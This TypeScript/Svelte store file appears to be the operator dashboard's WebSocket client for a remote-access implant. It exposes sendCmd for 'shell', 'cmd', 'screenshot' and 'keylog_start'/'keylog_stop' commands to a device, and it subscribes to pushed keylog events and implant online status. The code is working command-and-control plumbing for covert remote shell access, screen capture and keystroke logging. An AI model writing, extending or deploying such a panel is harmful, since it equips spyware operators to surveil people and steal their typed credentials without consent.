// src/lib/stores/deviceSocket.ts
//
// One WebSocket per device detail page.
// Usage:
//   import { createDeviceSocket } from '$lib/stores/deviceSocket';
//   const socket = createDeviceSocket(deviceId, token);
//
//   // Send a command, get a promise back
//   const result = await socket.sendCmd('shell', 'whoami');
//
//   // Subscribe to push events
//   socket.onEvent('keylog', (data) => { ... });
//
//   // Reactive connection state
//   $socket.connected   — boolean
//   $socket.deviceOnline — boolean (implant status)
//
// Call socket.destroy() when the component unmounts (onDestroy).

import { writable, get } from 'svelte/store';
import { v4 as uuidv4 } from 'uuid';

// ── Types ─────────────────────────────────────────────────────────────────────

export interface CmdResult {
    ok: boolean;
    data?: string;
    error?: string;
}

interface PendingCmd {
    resolve: (r: CmdResult) => void;
    timer: ReturnType<typeof setTimeout>;
}

type EventType = 'keylog' | 'alert' | 'status' | string;
type EventHandler = (payload: Record<string, unknown>) => void;

export interface DeviceSocketState {
    connected: boolean;
    deviceOnline: boolean;
    error: string | null;
}

// ── Factory ───────────────────────────────────────────────────────────────────

export function createDeviceSocket(deviceId: string) {
    const store = writable<DeviceSocketState>({
        connected: false,
        deviceOnline: false,
        error: null
    });

    const pending = new Map<string, PendingCmd>();
    const handlers = new Map<EventType, Set<EventHandler>>();

    let ws: WebSocket | null = null;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let destroyed = false;

    // ── WebSocket URL ─────────────────────────────────────────────────────
    function buildUrl() {
        const proto = typeof window !== 'undefined' ? window.location.protocol === 'https:' ? 'wss' : 'ws' : undefined;
        const host = typeof window !== 'undefined' ? window.location.host : undefined;
        return `${proto}://${host}/ws/frontend/${deviceId}`;
    }

    // ── Connect ───────────────────────────────────────────────────────────
    function connect() {
        if (destroyed) return;
        ws = new WebSocket(buildUrl());

        ws.onopen = () => {
            store.update((s) => ({ ...s, connected: true, error: null }));
        };

        ws.onmessage = (ev) => {
            let msg: Record<string, unknown>;
            try {
                msg = JSON.parse(ev.data as string);
            } catch {
                return;
            }

            const type = msg.type as string;

            if (type === 'status') {
                // Server-side status: either initial READY or implant online/offline push
                store.update((s) => ({
                    ...s,
                    deviceOnline: (msg.connected as boolean) ?? s.deviceOnline
                }));
                return;
            }

            if (type === 'response') {
                // Resolution of a pending sendCmd
                const id = msg.id as string;
                const entry = pending.get(id);
                if (entry) {
                    clearTimeout(entry.timer);
                    pending.delete(id);
                    entry.resolve({
                        ok: msg.ok as boolean,
                        data: msg.data as string | undefined,
                        error: msg.error as string | undefined
                    });
                }
                return;
            }

            if (type === 'event') {
                const event = msg.event as string;
                const set = handlers.get(event);
                if (set) set.forEach((h) => h(msg));
                // Also fire wildcard handlers
                const all = handlers.get('*');
                if (all) all.forEach((h) => h(msg));
                return;
            }
        };

        ws.onerror = () => {
            store.update((s) => ({ ...s, error: 'WebSocket error' }));
        };

        ws.onclose = () => {
            store.update((s) => ({ ...s, connected: false, deviceOnline: false }));
            // Reject all pending commands
            pending.forEach(({ resolve, timer }) => {
                clearTimeout(timer);
                resolve({ ok: false, error: 'WebSocket closed' });
            });
            pending.clear();

            if (!destroyed) {
                // Reconnect after 3 s
                reconnectTimer = setTimeout(connect, 3000);
            }
        };
    }

    // ── Public API ────────────────────────────────────────────────────────

    /**
     * Send a command to the device and await the response.
     * @param kind  "shell" | "cmd" | "screenshot" | "keylog_start" | "keylog_stop" | …
     * @param data  Optional string payload (e.g. the command text)
     * @param timeoutMs  How long to wait before rejecting (default 15 s)
     */
    function sendCmd(kind: string, data = '', timeoutMs = 15_000): Promise<CmdResult> {
        return new Promise((resolve) => {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                resolve({ ok: false, error: 'Not connected' });
                return;
            }

            const id = uuidv4();
            const timer = setTimeout(() => {
                pending.delete(id);
                resolve({ ok: false, error: 'Timeout' });
            }, timeoutMs);

            pending.set(id, { resolve, timer });

            ws.send(JSON.stringify({ id, type: kind, data }));
        });
    }

    /**
     * Register a handler for implant push events.
     * Use event = '*' to catch all events.
     */
    function onEvent(event: EventType, handler: EventHandler) {
        if (!handlers.has(event)) handlers.set(event, new Set());
        handlers.get(event)!.add(handler);
        return () => handlers.get(event)?.delete(handler); // returns unsubscribe fn
    }

    /** Tear down cleanly (call from onDestroy). */
    function destroy() {
        destroyed = true;
        if (reconnectTimer) clearTimeout(reconnectTimer);
        ws?.close();
    }

    connect();

    return {
        subscribe: store.subscribe,
        sendCmd,
        onEvent,
        destroy
    };
}
